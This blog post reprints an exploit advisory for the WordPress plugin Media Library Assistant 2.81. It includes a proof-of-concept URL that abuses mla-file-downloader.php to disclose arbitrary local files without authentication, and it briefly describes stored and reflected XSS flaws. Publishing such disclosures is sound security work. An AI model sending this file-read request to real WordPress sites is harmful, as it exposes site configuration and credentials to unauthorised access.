---
layout: post
title: WordPress Media Library Assistant 2.81
date: 2020-04-14 03:45 +0300
categories: [Exploits, File Inclusion]
tags: [exploits]
---








![](../../../assets/img/Exploits/wordpressmedia.png)

The plugin version 2.81 of WordPress Media Library Assistant has a vulnerability that allows for local file inclusion.

  

```
MD5 | b31e7279051191481d8919615b301f40
```

```perl
    # Exploit Title: Wordpress Plugin Media Library Assistant 2.81 - Local File Inclusion
    # Google Dork: N/A
    # Date: 2020-04-13
    # Exploit Author: Daniel Monzón (stark0de)
    # Vendor Homepage: http://davidlingren.com/
    # Software Link: https://wordpress.org/plugins/media-library-assistant/
    # Version: 2.81
    # Tested on: Windows 7 x86 SP1
    # CVE : CVE-2020-11731, CVE-2020-11732
    
    ----Local File Inclusion----------------------------
    
    There is a file inclusion vulnerability in the mla-file-downloader.php file. Example:
    
    http://server/wordpress/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=C:\Bitnami\wordpress-5.3.2-2\apps\wordpress\htdocs\wp-content\plugins\updraftplus\options.php
    
    Visiting the above URL would lead to disclosure of the contents of options.php. Note that this vulnerability does not require authentication.
    
    
    ----Multiple Cross-Site-Scripting-------------------
    
    There are both reflected and stored cross-site scripting vulnerabilities in almost all Settings/Media Library Assistant tabs, which allow remote authenticated users to execute arbitrary JavaScript.
    
    Note that this vulnerability requires authentication.
    
    
    
    Tested on Windows 7 Pro SP1 32-bit and Wordpress 5.3.2
```
{: .nolineno }

<br>

  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)